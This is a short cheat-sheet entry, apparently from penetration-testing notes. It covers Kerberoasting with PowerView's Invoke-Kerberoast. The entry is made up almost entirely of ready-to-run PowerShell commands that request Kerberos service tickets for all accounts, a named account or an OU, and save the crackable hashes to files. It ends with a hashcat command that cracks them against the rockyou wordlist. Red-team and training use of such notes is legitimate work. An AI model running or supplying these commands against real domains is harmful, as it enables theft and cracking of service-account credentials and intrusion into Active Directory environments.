# 03.16 Invoke-Kerberoast

> PowerView function to enumerate kerberoastable users and request their TGS — inline alternative to GetUserSPNs.py.

## Overview

Invoke-Kerberoast is a PowerView function that does the Kerberoast workflow inline from PowerShell — enumerate SPN-set users, request TGS for each, output crackable hashes. Use when you need to roast from a Windows host without dropping additional tooling (Rubeus, Impacket). Output format `hashcat` or `john`. Lighter than installing Rubeus when you already have PowerView loaded.

## Steps

- **Step 1** - Load PowerView.
- **Step 2** - Run Invoke-Kerberoast.
- **Step 3** - Pipe to file or directly to console.

## Commands

### All kerberoastable + hashcat format

```powershell
. .\PowerView.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII kerb.txt
```

### Specific user

```powershell
Invoke-Kerberoast -Identity <SVC-USER> -OutputFormat Hashcat
```

### John format

```powershell
Invoke-Kerberoast -OutputFormat John | Select-Object -ExpandProperty Hash | Out-File kerb_john.txt
```

### Specific OU

```powershell
Invoke-Kerberoast -SearchBase 'OU=Service Accounts,DC=<DOMAIN>,DC=local' -OutputFormat Hashcat
```

### Crack

```bash
hashcat -m 13100 -a 0 kerb.txt /usr/share/wordlists/rockyou.txt -r best64.rule -O
```
